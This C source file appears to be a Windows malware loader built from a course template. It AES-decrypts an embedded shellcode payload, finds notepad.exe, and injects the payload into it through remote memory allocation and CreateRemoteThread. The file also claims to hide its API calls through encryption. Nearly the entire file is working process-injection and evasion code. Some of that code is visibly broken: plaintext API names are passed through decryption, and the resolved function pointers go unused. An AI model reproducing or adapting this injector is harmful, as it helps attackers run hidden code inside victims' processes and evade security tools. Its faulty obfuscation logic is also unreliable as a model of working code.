#include "main.h"
// Template from sektor7 MDE - reenz0h

// GUITrick WINDOWS application
// Obfuscated API calls through AES api call encryption
// Encrypted Stub Stored in the .data section
// Locates target process & injects into it


char key[] = { 0x51, 0x54, 0x76, 0x18, 0x21, 0x26, 0xf5, 0x26, 0xce, 0xab, 0xb8, 0x6e, 0x86, 0xb7, 0x7a, 0x55 };


int AESDecrypt(char * payload, unsigned int payload_len, char * key, size_t keylen) {
        HCRYPTPROV hProv;
        HCRYPTHASH hHash;
        HCRYPTKEY hKey;

        if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)){
                return -1;
        }
        if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)){
                return -1;
        }
        if (!CryptHashData(hHash, (BYTE*)key, (DWORD)keylen, 0)){
                return -1;              
        }
        if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0,&hKey)){
                return -1;
        }
        
        if (!CryptDecrypt(hKey, (HCRYPTHASH) NULL, 0, 0, payload, &payload_len)){
                return -1;
        }
        
        CryptReleaseContext(hProv, 0);
        CryptDestroyHash(hHash);
        CryptDestroyKey(hKey);
        
        return 0;
}

int FindTarget(const char *procname) {

        HANDLE hProcSnap;
        PROCESSENTRY32 pe32;
        int pid = 0;
                
        hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (INVALID_HANDLE_VALUE == hProcSnap) return 0;
                
        pe32.dwSize = sizeof(PROCESSENTRY32); 
                
        if (!Process32First(hProcSnap, &pe32)) {
                CloseHandle(hProcSnap);
                return 0;
        }
                
        while (Process32Next(hProcSnap, &pe32)) {
                if (lstrcmpiA(procname, pe32.szExeFile) == 0) {
                        pid = pe32.th32ProcessID;
                        break;
                }
        }
                
        CloseHandle(hProcSnap);
                
        return pid;
}


int Inject(HANDLE hProc, unsigned char * payload, unsigned int payload_len) {

    LPVOID pRemoteCode = NULL;
    HANDLE hThread = NULL;
  
		unsigned char sVirtualAllocEx[] = { 0x56, 0x69, 0x72, 0x74, 0x75, 0x61, 0x6c, 0x41, 0x6c, 0x6c, 0x6f, 0x63, 0x45, 0x78 };
		unsigned char sWriteProcessMemory[] =  { 0x57, 0x72, 0x69, 0x74, 0x65, 0x50, 0x72, 0x6f, 0x63, 0x65, 0x73, 0x73, 0x4d, 0x65, 0x6d, 0x6f, 0x72, 0x79 };
		unsigned char sCreateRemoteThread[] = { 0x43, 0x72, 0x65, 0x61, 0x74, 0x65, 0x52, 0x65, 0x6d, 0x6f, 0x74, 0x65, 0x54, 0x68, 0x72, 0x65, 0x61, 0x64 };
		unsigned char sVirtualAlloc[] = { 0x56, 0x69, 0x72, 0x74, 0x75, 0x61, 0x6c, 0x41, 0x6c, 0x6c, 0x6f, 0x63 };

		AESDecrypt((char *) sVirtualAllocEx, sizeof(sVirtualAllocEx), key, sizeof(key));	
		AESDecrypt((char *) sWriteProcessMemory, sizeof(sWriteProcessMemory), key, sizeof(key));	
		AESDecrypt((char *) sCreateRemoteThread, sizeof(sCreateRemoteThread), key, sizeof(key));	
		AESDecrypt((char *) sVirtualAlloc, sizeof(sVirtualAlloc), key, sizeof(key));	
	
		pVirtualAllocEx = GetProcAddress(GetModuleHandle("kernel32.dll"), sVirtualAllocEx);
		pWriteProcessMemory = GetProcAddress(GetModuleHandle("kernel32.dll"), sWriteProcessMemory);
		pCreateRemoteThread = GetProcAddress(GetModuleHandle("kernel32.dll"), sCreateRemoteThread);
		pVirtualAlloc = GetProcAddress(GetModuleHandle("kernel32.dll"), sVirtualAlloc);


  
    pRemoteCode = VirtualAllocEx(hProc, NULL, payload_len, MEM_COMMIT, PAGE_EXECUTE_READ);
    WriteProcessMemory(hProc, pRemoteCode, (PVOID)payload, (SIZE_T)payload_len, (SIZE_T *)NULL);
    
    hThread = CreateRemoteThread(hProc, NULL, 0, pRemoteCode, NULL, 0, NULL);
    if (hThread != NULL) {
            WaitForSingleObject(hThread, 500);
            CloseHandle(hThread);
            return 0;
    }
    return -1;
}


int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    
	void * exec_mem;
	BOOL rv;
	HANDLE th;
  DWORD oldprotect = 0;

	
	unsigned char calc_payload[] = { 0x3f, 0x53, 0xb1, 0x7a, 0x35, 0x43, 0xfa, 0x82, 0x61, 0xbd, 0xff, 0xb4, 0x10, 0x97, 0x1a, 0xaa, 0xdd, 0x2b, 0xf3, 0x15, 0x38, 0x11, 0x56, 0x8, 0x20, 0xd6, 0x8, 0xa6, 0x87, 0x27, 0x44, 0x9d, 0xee, 0x8f, 0x9e, 0x99, 0x46, 0x2d, 0x6, 0x7a, 0x22, 0x64, 0x6c, 0x86, 0x6e, 0x4f, 0x2d, 0x8f, 0xcf, 0x85, 0x60, 0xf2, 0x86, 0xe9, 0xec, 0xfb, 0x1f, 0x67, 0xb0, 0xa7, 0x3f, 0xc5, 0x87, 0xf9, 0x9, 0xe, 0x94, 0xda, 0xd0, 0xc0, 0xbe, 0xcc, 0xdf, 0xc3, 0x9a, 0xca, 0x49, 0x9c, 0x87, 0x37, 0x9e, 0xcb, 0x46, 0x8, 0x80, 0x9b, 0x19, 0xee, 0x14, 0xd6, 0xc3, 0xe2, 0x29, 0x3, 0x7, 0x1b, 0x3e, 0x4d, 0xfc, 0x51, 0x3e, 0x1e, 0x41, 0xed, 0x50, 0xf7, 0x20, 0x8f, 0xac, 0x3f, 0xd6, 0xf8, 0xbb, 0xff, 0x15, 0xdf, 0xa, 0x59, 0xec, 0xe2, 0xd8, 0xd, 0x31, 0x79, 0x4e, 0x6e, 0x28, 0x1a, 0x3d, 0x48, 0x51, 0xbc, 0xa6, 0xc9, 0xd7, 0x26, 0xfe, 0x14, 0x57, 0x95, 0x50, 0xe, 0xcb, 0xc5, 0xaf, 0xa0, 0xc7, 0x9c, 0x6d, 0x9, 0x32, 0x40, 0xee, 0x7, 0x8c, 0x2b, 0x4e, 0x18, 0x1c, 0xfe, 0xb, 0x21, 0x42, 0xd1, 0xce, 0x7c, 0x9e, 0xa6, 0xa, 0x2f, 0xdb, 0x4e, 0x2, 0x70, 0xf3, 0x2a, 0xa1, 0x12, 0xf, 0xbc, 0xf7, 0xe3, 0xbb, 0x13, 0x36, 0x47, 0x9, 0xa1, 0x8f, 0xa5, 0xd5, 0x3a, 0xc5, 0xc2, 0x44, 0x9c, 0xc6, 0x55, 0x9d, 0x7b, 0x77, 0x6f, 0xef, 0x17, 0x5b, 0x48, 0xce, 0x27, 0xe2, 0xc, 0x87, 0x28, 0x76, 0xfc, 0x39, 0xc1, 0x31, 0xc, 0x70, 0x91, 0x32, 0x7b, 0x11, 0x9b, 0x77, 0xfd, 0x7d, 0x8b, 0x6b, 0x43, 0x9a, 0x5d, 0x91, 0x48, 0x16, 0x69, 0x19, 0x85, 0x1c, 0x6d, 0xa4, 0x22, 0x37, 0x32, 0xe7, 0x4b, 0xf7, 0xdb, 0xdb, 0xce, 0x80, 0xac, 0x6, 0x2, 0xeb, 0x21, 0x53, 0xb9, 0x57, 0x31, 0xdd, 0x25, 0x1e, 0xb1, 0x8, 0xd8, 0xa5, 0x26, 0x63, 0x3d, 0x2f, 0x4b, 0x27, 0x46, 0x1f, 0x59, 0x40, 0xac, 0x93, 0x8, 0x4c, 0x1, 0x6a, 0xba, 0x8, 0x6c, 0xab, 0x53 };
	unsigned int calc_len = sizeof(calc_payload);

	exec_mem = VirtualAlloc(0, calc_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	AESDecrypt((char *) calc_payload, calc_len, key, sizeof(key));	
	RtlMoveMemory(exec_mem, calc_payload, calc_len);
	rv = VirtualProtect(exec_mem, calc_len, PAGE_EXECUTE_READ, &oldprotect);
	
	int pid = 0;
    HANDLE hProc = NULL;

	pid = FindTarget("notepad.exe");

	if (pid) {
		hProc = OpenProcess( PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | 
						PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
						FALSE, (DWORD) pid);

		if (hProc != NULL) {
			Inject(hProc, calc_payload, calc_len);
			CloseHandle(hProc);
		}
	}
	return 0;

}

